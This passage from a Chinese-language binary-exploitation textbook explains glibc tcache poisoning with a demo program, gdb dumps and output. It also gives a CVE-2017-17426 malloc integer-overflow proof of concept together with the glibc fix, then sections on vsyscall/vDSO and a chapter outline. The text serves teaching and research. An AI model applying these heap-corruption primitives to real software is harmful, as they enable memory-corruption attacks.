4.14 glibc tcache 机制
gdb-peda$ p p3
$1 = (intptr_t *) 0x555555756260
gdb-peda$ p p2
$2 = (intptr_t *) 0x5555557562b0
gdb-peda$ p p1
$3 = (intptr_t *) 0x555555756260
gdb-peda$ x/36gx 0x555555756260-0x10
0x555555756250: 0x0000000000000000 0x0000000000000110 
#include 
#include 
#include 
int main() {
intptr_t *p1, *p2, *p3;
size_t target[10];
printf("Our target is a stack region at %p\n", (void *)targe
t);
p1 = malloc(0x30);
memset(p1, 0x41, 0x30+8);
fprintf(stderr, "Allocated victim chunk with requested size
0x30 at %p\n", p1);
fprintf(stderr, "Freed victim chunk to put it in a tcache bi
n\n");
free(p1);
fprintf(stderr, "Emulating corruption of the next ptr\n");
*p1 = (int64_t)target;
fprintf(stderr, "Now we make two requests for the appropriat
e size so that malloc returns a chunk overlapping our target\n")
;
p2 = malloc(0x30);
memset(p2, 0x42, 0x30+8);
p3 = malloc(0x30);
memset(p3, 0x42, 0x30+8);
fprintf(stderr, "The first malloc(0x30) returned %p, the sec
ond one: %p\n", p2, p3);
}
719
4.14 glibc tcache 机制
$ ./tcache_poisoning
Our target is a stack region at 0x7fffffffdcc0
Allocated victim chunk with requested size 0x30 at 0x55555575667
0
Freed victim chunk to put it in a tcache bin
Emulating corruption of the next ptr
Now we make two requests for the appropriate size so that malloc
returns a chunk overlapping our target
The first malloc(0x30) returned 0x555555756670, the second one:
0x7fffffffdcc0
该实例通过破坏 tcache bin 中 chunk 的 fd 指针，将其指向不同的位置，从而改变
tcache_entry 的 next 指针，在 malloc 时在任意位置得到 chunk。而
tcache_get() 函数没有对此做任何的检查。
分配一个 chunk p1 后释放，该 chunk 将被放入相应的 tcache bin，其 fd 指针被清
空：
gdb-peda$ x/10gx (void *)p1-0x10
0x555555756660: 0x0000000000000000 0x0000000000000041 
#include 
int main() {
void *x = malloc(10);
printf("malloc(10): %p\n", x);
free(x);
void *y = malloc(((size_t)~0) - 2); // overflow allocation (
size_t.max-2)
printf("malloc(((size_t)~0) - 2): %p\n", y);
}
$ gcc cve201717426.c
$ /usr/local/glibc-2.26/lib/ld-2.26.so ./a.out
malloc(10): 0x7f3f945ed260
malloc(((size_t)~0) - 2): 0x7f3f945ed260
$ /usr/local/glibc-2.27/lib/ld-2.27.so ./a.out
malloc(10): 0x7f399c69e260
malloc(((size_t)~0) - 2): (nil)
可以看到在使用 libc-2.26 时，第二次 malloc 返回了第一次 free 的堆块。而在使用
libc-2.27 时返回 NULL，说明该问题已被修复。
patch
该漏洞在 libc-2.27 的这次 commit 中被修复。方法是用更安全的
checked_request2size() 替换 request2size() ，以实现对整数溢出的检
查：
723
4.14 glibc tcache 机制
$ git show 34697694e8a93b325b18f25f7dcded55d6baeaf6 malloc/mallo
c.c | cat
commit 34697694e8a93b325b18f25f7dcded55d6baeaf6
Author: Arjun Shankar 
Date: Thu Nov 30 13:31:45 2017 +0100
Fix integer overflow in malloc when tcache is enabled [BZ #2
2375]
When the per-thread cache is enabled, __libc_malloc uses req
uest2size (which
does not perform an overflow check) to calculate the chunk s
ize from the
requested allocation size. This leads to an integer overflow
causing malloc
to incorrectly return the last successfully allocated block
when called with
a very large size argument (close to SIZE_MAX).
This commit uses checked_request2size instead, removing the
overflow.
diff --git a/malloc/malloc.c b/malloc/malloc.c
index 79f0e9eac7..0c9e0748b4 100644
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -3031,7 +3031,8 @@ __libc_malloc (size_t bytes)
return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
/* int_free also calls request2size, be careful to not pad tw
ice. */
- size_t tbytes = request2size (bytes);
+ size_t tbytes;
+ checked_request2size (bytes, tbytes);
size_t tc_idx = csize2tidx (tbytes);
MAYBE_INIT_TCACHE ();
724
4.14 glibc tcache 机制
参考资料
thread local caching in glibc malloc
MallocInternals
CVE-2017-17426
CVE-2017-17426 Detail
725
4.15 利用 vsyscall 和 vDSO
4.15 利用 vsyscall 和 vDSO
vsyscall
vDSO
CTF 实例
参考资料
在章节 1.5.9 中我们介绍了 Linux 系统调用的知识。这一节中将了解 vsyscall
和 vDSO 两种机制，它们被设计用来加速系统调用的处理。
vsyscall
$ cat /proc/self/maps | grep vsyscall
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0
[vsyscall]
vDSO
$ cat /proc/self/maps | grep vdso
7fff223aa000-7fff223ac000 r-xp 00000000 00:00 0
[vdso]
$ cat /proc/self/maps | grep vdso
7fff1048f000-7fff10491000 r-xp 00000000 00:00 0
[vdso]
CTF 实例
例如章节 6.1.6 的 ret2vdso。
参考资料
man vdso
726
4.15 利用 vsyscall 和 vDSO
Creating a vDSO: the Colonel's Other Chicken
727
五、高级篇
第五章 高级篇
5.0 软件漏洞分析
5.1 模糊测试
5.1.1 AFL fuzzer
5.1.2 libFuzzer
5.2 动态二进制插桩
5.2.1 Pin
5.2.2 DynamoRio
5.2.3 Valgrind
5.3 符号执行
5.3.1 angr
5.3.2 Triton
5.3.3 KLEE
5.3.4 S²E
5.4 数据流分析
5.4.1 Soot
5.5 污点分析
5.5.1 TaintCheck
5.6 LLVM
5.6.1 Clang
5.7 程序切片
5.8 SAT/SMT
5.8.1 Z3
5.9 基于模式的漏洞分析
5.10 基于二进制比对的漏洞分析
5.11 反编译技术
5.11.1 RetDec
728
5.0 软件漏洞分析
软件漏洞分析
软件漏洞分析的定义
软件分析技术概述
源代码漏洞分析
二进制漏洞分析
运行系统漏洞分析
参考资料